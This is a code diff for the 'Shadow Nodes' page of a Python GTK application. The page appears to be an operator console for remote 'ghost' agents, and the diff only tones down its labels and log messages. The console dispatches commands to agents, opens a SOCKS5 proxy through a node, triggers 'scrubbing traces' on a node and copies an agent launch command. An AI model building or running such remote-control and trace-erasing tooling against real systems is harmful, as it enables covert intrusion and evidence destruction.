@@ -1,7 +1,4 @@
-"""
-Shadow Nodes Page — Sovereign Ghost-Node Orchestration HUD.
-Directly manages remote agents, signal routing, and tactical delegation.
-"""
+"""Shadow Nodes page — manage remote ghost agents."""
 
 import gi
 import os
@@ -17,24 +14,23 @@ from shadowcypher.core.logger import logger
 
 class ShadowNodesPage(BasePage):
     def __init__(self):
-        super().__init__("\U0001f47b SHADOW_NODE_ORCHESTRATOR")
-        
-        # 1. Metrics
+        super().__init__("👻 Shadow Nodes")
+
         from shadowcypher.ui.components import DataPod
-        self.pod_active = DataPod("GHOST_SWARM", "0", "cyan")
-        self.pod_signal = DataPod("SIGNAL_STEALTH", "100%", "green")
-        self.pod_fluidity = DataPod("SOVEREIGN_FLUIDITY", "ULTIMATE", "amber")
+        self.pod_active = DataPod("Connected", "0", "cyan")
+        self.pod_signal = DataPod("Stealth", "100%", "green")
+        self.pod_fluidity = DataPod("Status", "Ready", "amber")
         
         for pod in [self.pod_active, self.pod_signal, self.pod_fluidity]:
             self.metric_strip.pack_start(pod, True, True, 0)
 
         # 2. Node Grid
-        frm = Gtk.Frame(label="GHOST_NODE_SWARM")
-        self.node_store = Gtk.ListStore(str, str, str, str, str) # Nick, FP, OS, Host, Status
+        frm = Gtk.Frame(label="Active nodes")
+        self.node_store = Gtk.ListStore(str, str, str, str, str)
         self.tree = Gtk.TreeView(model=self.node_store)
         self.tree.get_style_context().add_class("node-list")
-        
-        for i, t in enumerate(["OPERATOR", "FINGERPRINT", "PLATFORM", "SIGNAL_ORIGIN", "STATUS"]):
+
+        for i, t in enumerate(["Operator", "Fingerprint", "Platform", "Host", "Status"]):
             col = Gtk.TreeViewColumn(t, Gtk.CellRendererText(), text=i)
             col.set_resizable(True)
             self.tree.append_column(col)
@@ -47,7 +43,7 @@ class ShadowNodesPage(BasePage):
         frm.add(sw)
 
         # 3. Tactical Console (Interactive)
-        console_frame = Gtk.Frame(label="TACTICAL_CONSOLE_STREAM")
+        console_frame = Gtk.Frame(label="Console")
         console_box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=5)
         
         self.console_view = Gtk.TextView()
@@ -63,7 +59,7 @@ class ShadowNodesPage(BasePage):
         
         # Command Entry
         self.cmd_entry = Gtk.Entry()
-        self.cmd_entry.set_placeholder_text("ENTER_TACTICAL_COMMAND...")
+        self.cmd_entry.set_placeholder_text("Enter command...")
         self.cmd_entry.connect("activate", self._on_execute)
         console_box.pack_start(self.cmd_entry, False, False, 0)
         
@@ -161,7 +157,7 @@ class ShadowNodesPage(BasePage):
         nodes = ghost_orchestrator.get_active_nodes()
         self.node_store.clear()
         for n in nodes:
-            status = "CONNECTED" if (time.time() - n["last_seen"] < 60) else "STALE"
+            status = "Connected" if (time.time() - n["last_seen"] < 60) else "Stale"
             self.node_store.append([
                 n["nick"], 
                 n["fp"][:12], 
@@ -192,7 +188,7 @@ class ShadowNodesPage(BasePage):
                 break
         
         if full_fp:
-            self.log(f"DISPATCHING: '{cmd}' to {model[treeiter][0]}", "APEX")
+            self.log(f"→ '{cmd}' to {model[treeiter][0]}", "INFO")
             ghost_orchestrator.execute(full_fp, cmd)
             self.cmd_entry.set_text("")
         else:
@@ -214,9 +210,8 @@ class ShadowNodesPage(BasePage):
                 break
         
         if full_fp:
-            # Ephemeral port (could be randomized)
-            port = 1080 
-            self.log(f"IGNITING_PROXY: Node {model[treeiter][0]} on port {port}", "APEX")
+            port = 1080
+            self.log(f"Starting SOCKS5 proxy on port {port} via {model[treeiter][0]}...", "INFO")
             ghost_orchestrator.start_proxy(full_fp, port)
         else:
             self.log("ERROR: Node fingerprint mismatch.", "ERROR")
@@ -237,7 +232,7 @@ class ShadowNodesPage(BasePage):
                 break
         
         if full_fp:
-            self.log(f"IGNITING_DEEP_SCRUB: Purging traces on {model[treeiter][0]}...", "APEX")
+            self.log(f"Scrubbing traces on {model[treeiter][0]}...", "INFO")
             ghost_orchestrator.deep_scrub(full_fp)
         else:
             self.log("ERROR: Node fingerprint mismatch.", "ERROR")
@@ -245,7 +240,7 @@ class ShadowNodesPage(BasePage):
     def _on_ghost_output(self, data):
         nick = data.get("nick")
         output = data.get("output")
-        GLib.idle_add(self.log, f"[{nick}] RECEIVED:\n{output}", "SUCCESS")
+        GLib.idle_add(self.log, f"[{nick}]\n{output}", "SUCCESS")
 
     # ── Bind address helpers ──────────────────────────────────────
 
@@ -277,7 +272,7 @@ class ShadowNodesPage(BasePage):
             ghost_orchestrator.__class__._instance = None
             ghost_orchestrator.__init__()
             ghost_orchestrator.start()
-            self.log(f"NODE_LISTENER: restarted on {new_bind}:{getattr(ghost_orchestrator, 'port', 44444)}", "INFO")
+            self.log(f"Listener restarted on {new_bind}:{getattr(ghost_orchestrator, 'port', 44444)}", "INFO")
         except Exception as e:
             self.log(f"RESTART_ERROR: {e}", "ERROR")
 
@@ -290,4 +285,4 @@ class ShadowNodesPage(BasePage):
         cmd = f"./ghost-agent -host {host} -port {port}"
         clipboard = Gtk.Clipboard.get(Gdk.SELECTION_CLIPBOARD)
         clipboard.set_text(cmd, -1)
-        self.log(f"COPIED: {cmd}", "INFO")
+        self.log(f"Copied: {cmd}", "INFO")
